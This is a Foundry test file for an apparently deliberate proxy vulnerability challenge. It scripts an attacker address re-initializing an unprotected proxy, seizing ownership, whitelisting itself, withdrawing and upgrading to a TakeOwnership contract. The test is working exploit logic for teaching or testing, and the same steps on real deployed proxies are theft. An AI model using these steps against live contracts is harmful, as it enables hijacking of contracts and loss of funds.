// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {DasProxy} from "../src/DasProxy.sol";
import {Impl} from "../src/Impl.sol";
import {TakeOwnership} from "./TakeOwnership.sol";

contract ProxyTest is Test {
    DasProxy public proxy;
    Impl public impl;

    address public user = address(123);
    address public attacker = address(456);

    function setUp() public {
        vm.prank(user);
        impl = new Impl();
        vm.prank(user);
        proxy = new DasProxy(address(impl), "");
        deal(user, 1 ether);
        deal(address(this), 1 ether);
        deal(attacker, 1 ether);
    }

    function testProxyIsNotInitialized() public {
        (bool validResponse, bytes memory returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));

        assertEq(owner, address(0), "!owner");
        assertEq(impl.owner(), user, "!owner");
    }

    function testTaskFlow() public {
        (bool validResponse, bytes memory returnedData) = address(proxy).call{value: 0.1 ether}(
            abi.encodeWithSignature("initialize(address)", address(0))
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        address owner = abi.decode(returnedData, (address));
        assertEq(owner, address(this));

        // attacker can call initialize
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call{value: 0.1 ether}(
            abi.encodeWithSignature("initialize(address)", address(0))
        );
        assertTrue(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        owner = abi.decode(returnedData, (address));
        assertEq(owner, attacker);

        // attacker can call upgrade
        vm.prank(attacker);
        TakeOwnership takeOwnership = new TakeOwnership();

        // cannot update without withdrawing funds
        vm.prank(attacker);
        vm.expectRevert(bytes("!withdraw"));
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
        );

        // cannot update without whitelisting
        vm.prank(attacker);
        vm.expectRevert(bytes("!whitelisted"));
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(0))
        );

        // whitelist owner
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("whitelistUser(address)", attacker)
        );
        
        // cannot update without withdrawing funds
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("withdraw(uint256)", 2)
        );

        // upgrade proxy
        vm.prank(attacker);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(takeOwnership))
        );
        assertTrue(validResponse);

        // cannot initalize
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("initialize(address)", address(0))
        );
        assertFalse(validResponse);
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(validResponse);
        owner = abi.decode(returnedData, (address));
        // owner is still attacker
        assertEq(owner, attacker);

        // cannot upgrade proxy impl
        (validResponse, returnedData) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(impl))
        );
        assertFalse(validResponse);
    }
}